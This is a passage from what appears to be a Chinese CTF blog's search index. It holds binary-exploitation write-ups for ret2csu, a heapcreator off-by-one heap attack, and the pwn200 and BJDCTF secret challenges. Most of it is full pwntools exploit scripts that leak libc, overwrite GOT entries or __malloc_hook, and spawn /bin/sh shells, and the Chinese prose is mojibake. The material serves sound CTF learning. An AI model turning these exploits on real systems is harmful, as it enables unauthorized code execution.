on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(p.recv(8)) gdb.attach(p) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') print(hex(libc_base)) system = libc_base + libc.dump('system') binsh = libc_base + libc.dump('str_bin_sh') ''' libc = ELF('./libc-2.23.so') libc_base = write_addr - libc.symbols['write'] print('libcbase ----&gt; ' + hex(libc_base)) system = libc_base + libc.symbols['system'] binsh = libc_base + libc.search(b'/bin/sh').__next__() ''' p.recvuntil('~\\n') payload = b'a' * 0x88 pop_ret = 0x400613 payload += p64(pop_ret) + p64(binsh) + p64(system) print(&quot;binsh -----&gt; &quot; + hex(binsh)) print(&quot;system -----&gt; &quot; + hex(system)) p.sendline(payload) p.interactive() ç„¶åè´´ä¸€ä¸‹æˆ‘é­”æ”¹äº†å¸ˆå‚…çš„exp from pwn import * from LibcSearcher import LibcSearcher def ret2libc(leak, func, path=''): if path == '': libc = LibcSearcher(func, leak) base = leak - libc.dump(func) system = base + 0x3f550 - 0x1000 wrong = base + libc.dump('system') print(hex(wrong)) binsh = base + libc.dump('str_bin_sh') print('str çš„åç§»ä¸º ï¼š ' + hex(libc.dump('str_bin_sh'))) print('system çš„åç§»ä¸º ï¼š' + hex(libc.dump('system'))) else: libc = ELF(path) base = leak - libc.sym[func] system = base + libc.sym['system'] binsh = base + libc.search(b'/bin/sh').__next__() return (system,binsh,base) def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 # or csu(0,1,got_write,1,got_write,8,main) The csu functions of different programs need to be analyzed concretely payload = b'a' * 0x88 payload += p64(gadget_pop) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget_call) payload += b'a' * 0x38 payload += p64(last) p.send(payload) return payload s = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\0')) uu64 = lambda data :u64(data.ljust(8,b'\\0')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) context.log_level = 'DEBUG' binary = './pwn2' context.binary = binary elf = ELF(binary,checksec=False) def dbg(): gdb.attach(p) pause() p = process(binary) #p = remote(&quot;47.95.195.235&quot;,44002) #libc = ELF(&quot;./libc-2.23.so&quot;) main = 0x400587 gadget_pop = 0x40060B gadget_call =0x4005F0 got_write = elf.got['write'] p.recvuntil('\\n') csu(0,1,got_write,8,got_write,1,main) gdb.attach(p) #ru(&quot;welcome~\\n&quot;) write_addr = uu64(r(6)) print('write ---&gt; ' + hex(write_addr)) system,binsh,base = ret2libc(write_addr,'write','') print('system ----&gt; ' + hex(system)) print('binsh ----&gt; ' + hex(binsh)) print(hex(base)) pop_ret = 0x400613 payload3 = b'a' * 136 + p64(pop_ret) + p64(binsh) + p64(system) sla(&quot;welcome~\\n&quot;,payload3) itr() orz wtcl ","link":"https://l3mon629.github.io/post/ret2csu-suo-duan-payload/"},{"title":"ä¸€é“gotè¡¨å¯å†™çš„off-by-one â€” hitcontraining_heapcreator","content":"è¿™ä¸ªé¢˜å‡ºäº†ä¸€äº›å‘ç‚¹ï¼Œæˆ‘åäº†ï¼Œåšäº†å¥½ä¹… å…ˆæ­£å¸¸èµ°ä¸€éå§ off-by-oneçš„æµç¨‹å°±æ˜¯extend chunk ç²—ç³™çš„å†™ä¸€ä¸‹åˆ»åœ¨DNAé‡Œçš„expï¼Œç»†èŠ‚é—®é¢˜é”™äº†å°±é”™äº†å§ malloc(overflow) malloc(1) malloc(2) malloc(æˆ‘æ¥å®ˆæŠ¤ä¸Šé¢ä¿©ä¸œè¥¿ä¸è¢«top chunkåƒæ‰) edit(0,payload) free(1) free(2) leak_libc() some_functions_addr() malloc(size(1) + size(2)) edit(1,å†™åˆ°chunk2çš„fd pointer) ç„¶åå°±æ˜¯fastbin attack å—¯ï¼Œæˆ‘ä¸€å¼€å§‹ä¹Ÿè¿™æ ·åšçš„ï¼Œå¾ˆé¡ºåˆ©åœ¨æœ¬åœ°getshellï¼Œä½†æ˜¯è¿œç¨‹æ‰“ä¸é€š åœ¨ä»“åº“é‡Œæœ‰æœ¬é¢˜ç›®çš„æºç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; void read_input(char *buf,size_t size){ int ret ; ret = read(0,buf,size); if(ret &lt;=0){ puts(&quot;Error&quot;); _exit(-1); } } struct heap { size_t size ; char *content ; }; struct heap *heaparray[10]; void menu(){ puts(&quot;--------------------------------&quot;); puts(&quot; Heap Creator &quot;); puts(&quot;--------------------------------&quot;); puts(&quot; 1. Create a Heap &quot;); puts(&quot; 2. Edit a Heap &quot;); puts(&quot; 3. Show a Heap &quot;); puts(&quot; 4. Delete a Heap &quot;); puts(&quot; 5. Exit &quot;); puts(&quot;--------------------------------&quot;); printf(&quot;Your choice :&quot;); } void create_heap(){ int i ; char buf[8]; size_t size = 0; for(i = 0 ; i &lt; 10 ; i++){ if(!heaparray[i]){ heaparray[i] = (struct heap *)malloc(sizeof(struct heap)); if(!heaparray[i]){ puts(&quot;Allocate Error&quot;); exit(1); } printf(&quot;Size of Heap : &quot;); read(0,buf,8); size = atoi(buf); heaparray[i]-&gt;content = (char *)malloc(size); if(!heaparray[i]-&gt;content){ puts(&quot;Allocate Error&quot;); exit(2); } heaparray[i]-&gt;size = size ; printf(&quot;Content of heap:&quot;); read_input(heaparray[i]-&gt;content,size); puts(&quot;SuccessFul&quot;); break ; } } } void edit_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Content of heap : &quot;); read_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+1); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } void show_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Size : %ld\\nContent : %s\\n&quot;,heaparray[idx]-&gt;size,heaparray[idx]-&gt;content); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } void delete_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ free(heaparray[idx]-&gt;content); free(heaparray[idx]); heaparray[idx] = NULL ; puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } int main(){ char buf[4]; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); while(1){ menu(); read(0,buf,4); switch(atoi(buf)){ case 1 : create_heap(); break ; case 2 : edit_heap(); break ; case 3 : show_heap(); break ; case 4 : delete_heap(); break ; case 5 : exit(0); break ; default : puts(&quot;Invalid Choice&quot;); break; } } return 0 ; } é€†å‘ å¾ˆå®¹æ˜“ï¼Œæ²¡æœ‰å»é™¤ç¬¦å·è¡¨ï¼Œå¾ˆnice åˆ›å»ºå †å—ï¼Œè¿™é‡Œmalloc(0x10)æ¥ç®¡ç†å †å— ç¼–è¾‘åŠŸèƒ½å­˜åœ¨off-by-oneæ¼æ´ï¼Œå¯ä»¥æº¢å‡ºä¸€å­—èŠ‚ freeåŠŸèƒ½æ²¡æœ‰use after free æ¼æ´ showåŠŸèƒ½ï¼Œå¯ä»¥æ¥leak libc pwn itï¼ï¼ï¼ æˆåŠŸçš„æ–¹æ³•ï¼šå€ŸåŠ©heaparrayæ¥æ”¹å†™æŒ‡é’ˆ å¯ä»¥çœ‹åˆ°ç®¡ç†ç”¨æˆ·å †çš„å†…å®¹ä¸Šæ˜¯æœ‰æŒ‡é’ˆçš„ï¼Œæˆ‘æœ€å–œæ¬¢æŒ‡é’ˆäº†ï¼ˆä¸æ˜¯ ç„¶åæˆ‘ä»¬å¯ä»¥æ”¹å†™æŒ‡é’ˆï¼Œå› ä¸ºé˜²æŠ¤æ˜¯è¿™æ ·çš„ï¼š æ‰€ä»¥å¯ä»¥æ”»å‡»gotè¡¨ï¼Œæ³¨æ„ï¼Œæ”»å‡»gotçš„è¡¨çš„æ ¸å¿ƒåœ¨äºï¼Œï¼Œè¿™ä¸ªé¢˜æ˜¯æœ‰ç°æˆçš„æŒ‡é’ˆå¯ä»¥åˆ©ç”¨ï¼å¦‚æœæ²¡æœ‰çš„è¯ï¼Œåœ¨ubuntu 16ä¸­ï¼Œæˆ‘ä»¬æ”»å‡»gotè¡¨çš„æˆæœ¬ä¼šå¾ˆé«˜ï¼Œå› ä¸ºè¦ä¼ªé€ fastbinçš„sizeä½ é‚£æˆ‘ä»¬æ€è·¯å°±æ˜¯æœ¬æ–‡ä¸€å¼€å§‹è¯´çš„ï¼Œåªä¸è¿‡ä¸è¦†ç›–fdæŒ‡é’ˆè€Œæ˜¯è¦†ç›–é¢˜ç›®ç»™æˆ‘ä»¬ç•™ä¸‹çš„ç½¢äº† å…ˆè¯´è¯´å‘ç‚¹å§ï¼Œæˆ‘ç”¨äº†libc-2.23.soï¼Œä½†æ˜¯è¿œç¨‹æ‰“ä¸é€šï¼Œæœ¬åœ°å¯é€šï¼Œå°±å¾ˆéš¾å—ï¼Œæ‰€ä»¥å¹²è„†ç›´æ¥LibcSearcher ï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´ ğŸ˜¦ å½“æ—¶åšé¢˜çš„æ€è·¯éƒ½å†™åœ¨printè¯­å¥é‡Œäº†ï¼Œè¿˜æŒºå¥½çš„ exp: from pwn import * from LibcSearcher import * #l3mon_w@nts_A_g1rLfri3nd (bushi) #context.log_level = 'debug' local = 1 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',28861) #libc = ELF('./libc.so.6') elf = ELF('./heapcreator') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;ç¬¬äºŒä¸ªexpçš„æ€è·¯æ˜¯å› ä¸ºè¿™ä¸ªé¢˜ç›®æœ‰heaparrayæ¥ç®¡ç†æˆ‘ä»¬ç”³è¯·çš„å †å—ï¼Œåœ¨heaparrayä¸­æœ‰æŒ‡å‘å†…å®¹çš„æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ”¹å†™æŒ‡é’ˆæ¥è¦†ç›–gotè¡¨ï¼ˆgotè¡¨ï¼‰å¯å†™&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 pause() add(0x60,'C') #chunk2 add(0x10,'/bin/sh\\x00') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) delete(2) print(&quot;æ­¤æ—¶big chunkå·²ç»æ„é€ å®Œæˆï¼Œby gdb , we know the unsorted bin fd ptr and bk ptr&quot;) print(&quot;(by free 0x60 , we can change the fd pointer to fastbin attack) &lt;-------------------- ä¹‹å‰çš„æ€è·¯&quot;) print(&quot;this method is attack free@got, the free(sth) = sysetm(/bin/sh;) &quot;) print(&quot;(if we cannot success ,we could use some methods to attack got) &lt;--------------------- so we change that :( !!!!!!!&quot;) add(0xe0,'E') #chunk4 = big chunk print(&quot;we can leak libc&quot;) show(1) p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump('__malloc_hook') print(hex(libc_base)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we attack free@got &quot;) free_got = elf.got['free'] #free_addr = libc_base + libc.symbols['free'] system_addr = libc_base + libc.dump('system') print(&quot;free ----------&gt; &quot; + hex(free_got)) print(&quot;system -------&gt; &quot; + hex(system_addr)) payload = p64(__malloc_hook) * 2 payload = payload + p64(0) + p64(0x41) payload = payload + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(free_got) edit(1,payload) add(0x60,'AAAAAAAA') #chunk5 = chunk2 print(&quot;!!!!!!!!!!!!!!!!!!!!!! è¿™é‡Œä¸ç¡®å®šç¼–è¾‘å—5è¿˜æ˜¯å—2ï¼Œæˆ‘ä»¬å°±åŠ ä¸Šp.interactive()æ‹¿åˆ°åŸå§‹çš„äº¤äº’ç¨‹åºè°ƒè¯•ä¸€ä¸‹ï¼Œç»è¿‡è°ƒè¯•å‘ç°æ²¡æœ‰å—5ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åº”è¯¥ç¼–è¾‘chunk2&quot;) #edit(1,'BBBBBBBB') print(&quot;è¿™é‡Œå¾ˆå¥‡æ€ªï¼Œå½“æ—¶æˆ‘å‘ç°å¤§chunkçš„heaparrayåœ¨å®ƒä¸‹é¢ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯ä¸­é—´å‡ºç°äº†ä¸å¯é¢„çŸ¥çš„é”™è¯¯ï¼Œä½†æ˜¯ç»è¿‡è°ƒè¯•å‘ç°ï¼Œå½“æˆ‘æ”¹å—1çš„æ—¶å€™ï¼Œfree_gotè¢«æ”¹äº†ï¼Œé‚£åªèƒ½è¯æ˜æ˜¯æ”¹chunk1äº†&quot;) print(&quot;å°å£°bbï¼Œç†ä¸æ¸…æµç¨‹å°±é€ä¸ªè°ƒè¯•ï¼ˆä¸æ˜¯ï¼‰&quot;) edit(1,p64(system_addr)) print(&quot;é€šè¿‡freeæ¥è§¦å‘ system(/bin/sh\\00) æœ¬åœ°æµ‹è¯•å¯æ‹¿shellï¼Œ ç¾æ±æ± :) å¥½ï¼Œå¥½èµ·æ¥äº†ï¼ˆä¸æ˜¯ï¼‰&quot;) delete(3) p.interactive() å¤±è´¥çš„æ–¹æ³•ï¼šone_gadgetæ‰“__malloc_hook æœ¬åœ°ä¹Ÿèƒ½æ‹¿shellï¼Œé‚£è‚¯å®šå°±æ˜¯libcçš„åŸå› äº†ï¼Œone_gadgetåœ°å€ä¸ä¸€æ ·çš„åŸå› åº”è¯¥æ˜¯ ä½†æ˜¯å¾ˆå¥‡è‘©ï¼Œä¸ºç¥é©¬è¿™ä¹ˆè¯´å‘¢ï¼Œå½“æˆ‘æ‰“one_gadgetçš„æ—¶å€™å‘ç°$rsp + 0x70çš„ä½ç½®æ˜¯NULLï¼Œä½†æ˜¯one_gadgetæ‰“ä¸é€šï¼Œåå€’æ˜¯rsp + 0x30å¯ä»¥é€š æˆªå›¾ï¼š ä½†æ˜¯æˆ‘ç”¨0x30çš„gadgetç«Ÿç„¶é€šäº†ï¼Œæœ¬åœ°å¯æ‹¿shell ä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œåæ­£æˆ‘äººå‚»äº†ï¼Œæœ‰æ„Ÿå…´è¶£çš„å¸ˆå‚…å¯ä»¥è°ƒè¯•ä¸€ä¸‹ä»€ä¹ˆåŸå› ï¼Œç„¶åç»™å¼Ÿå¼Ÿè®²è®²ï¼ˆorz è´´ä¸€ä¸‹expå§ï¼Œä¸‹åˆå†è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹LibcSearcherèƒ½ä¸èƒ½é€š exp: from pwn import * #context.log_level = 'debug' local = 1 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',26697) libc = ELF('./libc.so.6') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;åˆæ­¥æ€è·¯æ˜¯off-by-oneï¼Œå¯ä»¥æº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘æ„é€ é‡å chunk&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 add(0x60,'C') #chunk2 add(0x10,'D') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) print(&quot;æ­¤æ—¶big chunkå·²ç»æ„é€ å®Œæˆï¼Œby gdb , we know the unsorted bin fd ptr and bk ptr&quot;) delete(2) print(&quot;by free 0x60 , we can change the fd pointer to fastbin attack&quot;) print(&quot;this method is 'one_gadget' &quot;) print(&quot;if we cannot success ,we could use some methods to attack got&quot;) add(0xe0,'E') #chunk4 print(&quot;we can leak libc&quot;) show(1) #p.recv() p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc_base = __malloc_hook - libc.symbols['__malloc_hook'] one_gadget_list = [0x3f3d6,0x3f42a,0xd5bf7] one_gadget = libc_base + one_gadget_list[1] print(hex(libc_base)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we do fake chunk&quot;) payload = p64(0) * 3 + p64(0x41) + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(0x9ba050) + p64(0) + p64(0x71) payload = payload + p64(__malloc_hook-0x23) edit(1,payload) add(0x60,p64(__malloc_hook-0x23)) add(0x60,b'A' * 0x13 + p64(one_gadget)) pause() p.interactive() åˆå®éªŒäº†ä¸¤æ¬¡ï¼Œå¤±è´¥çš„æ–¹æ³•ç»ˆäºé€šäº† æ€ä¹ˆè¯´å‘¢ï¼Œæ¯”èµ›ä¸ç»™libcæœç„¶æ˜¯æµæ°“é¢˜ åœ¨githubä¸Šä¸‹äº†ä¿©libcéƒ½ä¸è¡Œï¼Œæœ€åç”¨buuctfèµ„æºåº“é‡Œé¢æä¾›çš„libcæ‰“é€šäº† expæ²¡å˜ï¼Œå°±æ˜¯å¤šåŠ äº†ä¸¤è¡Œone_gadget_list(å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆè‰) from pwn import * #context.log_level = 'debug' local = 0 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',26902) libc = ELF('./libc-2.23.so') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;åˆæ­¥æ€è·¯æ˜¯off-by-oneï¼Œå¯ä»¥æº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘æ„é€ é‡å chunk&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 add(0x60,'C') #chunk2 add(0x10,'D') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) print(&quot;æ­¤æ—¶big chunkå·²ç»æ„é€ å®Œæˆï¼Œby gdb , we know the unsorted bin fd ptr and bk ptr&quot;) delete(2) print(&quot;by free 0x60 , we can change the fd pointer to fastbin attack&quot;) print(&quot;this method is 'one_gadget' &quot;) print(&quot;if we cannot success ,we could use some methods to attack got&quot;) add(0xe0,'E') #chunk4 print(&quot;we can leak libc&quot;) show(1) #p.recv() p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc_base = __malloc_hook - libc.symbols['__malloc_hook'] #one_gadget_list = [0x3f3d6,0x3f42a,0xd5bf7] #one_gadget_list = [0x45226,0x4527a,0xf0364,0xf1207] #one_gadget_list = [0x45206,0x4525a,0xef9f4,0xf0897] one_gadget_list = [0x45216,0x4526a,0xf02a4,0xf1147] one_gadget = libc_base + one_gadget_list[1] print(hex(libc_base)) print(&quot;one_gadget:&quot; + hex(one_gadget)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we do fake chunk&quot;) payload = p64(0) * 3 + p64(0x41) + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(0x9ba050) + p64(0) + p64(0x71) payload = payload + p64(__malloc_hook-0x23) edit(1,payload) add(0x60,p64(__malloc_hook-0x23)) add(0x60,b'A' * 0x13 + p64(one_gadget)) p.interactive() ","link":"https://l3mon629.github.io/post/yi-dao-got-biao-ke-xie-de-off-by-one-hitcontraining_heapcreator/"},{"title":"buu-pwn(1)","content":"xdctf2015_pwn200 **é¢˜ï¼Œç®€å•é¢˜ï¼Œäº”åˆ†é’Ÿèƒ½å‡ºçš„é¢˜ç»™ğŸ‘´æ•´äº†ä¸€ä¸ªå¤šå°æ—¶ï¼Œå…¨æ˜¯æœ¬åœ°çš„libcå’‹ä¹ŸåŠ è½½ä¸ä¸Šå»ï¼Œå¹²è„†ç›´æ¥LibcSearcher æ²¡å•¥å¥½è¯´çš„ï¼Œåªå¼€äº†nx expï¼š from pwn import * from LibcSearcher import LibcSearcher #libc = ELF('./libc.so.6') #elf = ELF('./bof') local = 0 if local == 1: p = process('./bof') else: p = remote('node3.buuoj.cn',25267) p.recvuntil('Welcome to XDCTF2015~!\\n') offset = 0x6C + 0x4 write_plt = 0x080483C0 main_addr = 0x0804851C write_got = 0x0804A01C payload = offset * b'A' + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got) + p32(0x4) p.sendline(payload) write_addr = u32(p.recv()[0:4]) libc = LibcSearcher('write',write_addr) print(&quot;write:&quot; + hex(write_addr)) libc_base = write_addr - libc.dump('write') print('libcbase:' + hex(libc_base)) system_addr = libc_base + libc.dump('system') binsh_addr = libc_base + libc.dump('str_bin_sh') print(hex(binsh_addr)) payload = offset * b'A' + p32(system_addr) * 2 + p32(binsh_addr) p.sendline(payload) p.interactive() [BJDCTF 2nd]secret ç¬¬ä¸€æ¬¡ç¢°è§è¿™æ ·çš„é¢˜ï¼Œå¥½é¢˜ï¼ æ²¡æœ‰åšå‡ºæ¥wtcl æ€»ç»“ï¼Œä¸ºå•¥æ²¡åšå‡ºæ¥ï¼Ÿ 1ï¼Œæ‰¾åˆ°æº¢å‡ºç‚¹äº†ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ 2ï¼Œç¢°è§ä¸€å †æ±‡ç¼–ç å°±çœ‹ä¸ä¸‹å»äº†ï¼Œæ²¡æœ‰ä»”ç»†åˆ†æ å®Œæ•´è§£é¢˜è¿‡ç¨‹ï¼š checksecå‘ç°åªå¼€äº†nx æ‹¿åˆ°ida mainå‡½æ•°ï¼š __int64 __fastcall main(__int64 a1, char **a2, char **a3) { myinit(); if ( judge(a1, a2) ) wrong(); system(&quot;cat /flag&quot;); return 0LL; } å‘ç°æ˜¯æœ‰åé—¨çš„ï¼Œä½†æ˜¯å¥½åƒè¦ä¸è§¦å‘ifæ‰å¯ä»¥ï¼Œå¦‚æœifæ¡ä»¶æ»¡è¶³ï¼Œå°±ä¼šè¿›å…¥wrongï¼Œç‚¹è¿›å»çœ‹çœ‹æ˜¯è¿™æ ·çš„ wrongå‡½æ•°ï¼š void __noreturn wrong() { puts(&quot;#====================================#&quot;); puts(&quot;# GAME OVER #&quot;); puts(&quot;#====================================#&quot;); write_string(&quot;# BYE BYE~ #&quot;, 0x12); printf(buf, 0x12LL); puts(&amp;byte_46B0A7); puts(&quot;@====================================@&quot;); exit(0); } å°±é€€å‡ºç¨‹åºäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç‚¹è¿›å»ifé‡Œé¢çš„judgeå‡½æ•°çœ‹çœ‹ è¿™æ®µæ— æ³•æ˜¾ç¤ºä¸ºä¼ªä»£ç ï¼ˆå¥½åƒæ˜¯å¤§å°é™åˆ¶çš„åŸå› ï¼Œæ”¹idcè„šæœ¬åº”è¯¥å¯ä»¥åç¼–è¯‘ï¼Œä½†æ˜¯æˆ‘ä¸ä¼šorzï¼‰ ä»”ç»†é˜…è¯»æ±‡ç¼–ç ï¼Œå¯ä»¥å‘ç°é‡Œé¢æœ‰å¾ˆå¤šæ¯”è¾ƒçš„æ“ä½œï¼Œæˆ‘ä»¬èµ°åˆ°ç¨‹åºé‡Œï¼Œä¸å¦¨è¾“å…¥ä¸€ä¸ªæ•°å­—çœ‹çœ‹ï¼Œå‘ç°æ˜¯çŒœæ•°å­—çš„æ¸¸æˆï¼Œè¿ç»­çŒœå¯¹å°±å¯ä»¥è·å¾—flagï¼Œä½†æ˜¯è¦çŒœ10000æ¬¡ï¼Œåœ¨myinitå‡½æ•°é‡Œé¢ ç¬¬ä¸€ä¸ªç‚¹æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œé‡Œé¢å­˜äº†10000ï¼Œåº”è¯¥å°±æ˜¯çŒœå¯¹çš„æ¬¡æ•°ï¼Œä½†æ˜¯æ˜¯æŒ‡é’ˆï¼ŒæŒ‡é’ˆéƒ½æ˜¯éå¸¸å±é™©çš„ï½ ç„¶åç¬¬äºŒä¸ªç‚¹å°±æ˜¯æœ‰ä¸€ä¸ªreadï¼Œå¯ä»¥æº¢å‡ºï¼Œæˆ‘ä»¬ç‚¹è¿›å»bufçœ‹çœ‹ å¯ä»¥çœ‹åˆ°é‚£ä¸ªæŒ‡é’ˆå°±åœ¨bufä¸‹é¢0x10å¤„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯æ§çš„ç©ºé—´æ˜¯0x16ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶targetæŒ‡é’ˆã€‚ é‚£ä¹ˆæˆ‘ä»¬æ§åˆ¶åˆ°å“ªé‡Œå‘¢ï¼Ÿ æˆ‘ä»¬åœ¨pwndbgé‡Œé¢å‘ç°printfçš„pltå’Œsystemçš„pltå¾ˆæ¥è¿‘ï¼Œå°±å·®0x10ï¼Œè€Œä¸”æ˜¯printfçš„pltæ¯”systemçš„å¤§0x10ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠtargetæ”¹å†™æˆprintfçš„gotåœ°å€ï¼Œç„¶åæ¯å½“çŒœå¯¹ä¸€æ¬¡targetå°±ä¼šå‡ä¸€ï¼Œå½“æˆ‘ä»¬çŒœå¯¹15æ¬¡ï¼Œç¬¬åå…­æ¬¡çŒœé”™å°±ä¼šè°ƒç”¨printf è€Œè¿™ä¸ªæ—¶å€™ï¼Œprintf@pltå·²ç»è¢«æ”¹æˆäº†system@pltï¼Œç„¶åå­˜åœ¨bufé‡Œé¢çš„å­—ç¬¦ä¸²ä¼šè¢«å½“æˆå‚æ•°ä¼ å…¥systemï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨è¾“å…¥nameçš„æ—¶å€™æŠŠbinshæ‰“è¿›å»å°±å¥½äº† expï¼š from pwn import * local = 0 #context.log_level = 'debug' if local == 1: p = process('./secret') else: p = remote('node3.buuoj.cn',25527) elf = ELF('./secret') printf_got = elf.got['printf'] payload = b'/bin/sh\\x00' + b'A' * (0x10 - 0x8) + b'\\x40\\xD0\\x46' #æœ€åé¢çš„æ˜¯printfçš„gotåœ°å€ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨p32å‘è¿‡å» #print(payload) p.sendline(payload) #pause() number = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63] for i in range(0,15): payload = number[i] p.recvuntil('Secret:') p.sendline(str(payload)) #pause() p.sendlineafter('Secret:','1') p.interactive() ciscn_2019_es_1 ä»Šå¤©å¤ªå¿™äº†ï¼Œåˆšæ¬äº†å®¿èˆï¼Œæ¢äº†æ–°ç¯å¢ƒï¼Œå¿™é‡Œå·é—²æ‰“äº†ä¸€é“å»å¹´çš„å›½èµ›é¢˜ ç›®å‰å°±æ‰¾åˆ°ä¸¤ç§æ€è·¯ï¼Œç¬¬ä¸€ç§æ€è·¯æ‰“fastbinçš„æ—¶å€™æœ‰äº›é—®é¢˜ï¼Œå› ä¸ºä¸å¤ªæ¸…æ¥špythonæ€ä¹ˆä¼ ç©ºå­—ç¬¦ä¸²ä¹‹ç±»çš„é—®é¢˜ï¼Œå¯¼è‡´ç»“æ„ä½“é‡Œé¢çš„æŒ‡é’ˆä¸€ç›´åœ¨å˜ï¼Œæ‰€ä»¥è¿™ç§æ€è·¯ç­‰è¿‡ä¸¤å¤©æœ‰ç©ºçš„æ—¶å€™å†æƒ³æƒ³å§ã€‚ç¬¬äºŒç§æ€è·¯å°±æ˜¯æ‰“__free_hookï¼Œ__free_hook(ready to free) === system(&quot;/bin/sh\\x00&quot;) å‡ ä¸ªç‚¹ï¼š å½“é¢˜ç›®å¯¹äºç”³è¯·çš„chunkå¤§å°é™åˆ¶æ— è¦æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”³è¯·å¤§chunkï¼Œfreeåæ”¾å…¥unsorted binç›´æ¥æ³„æ¼libc 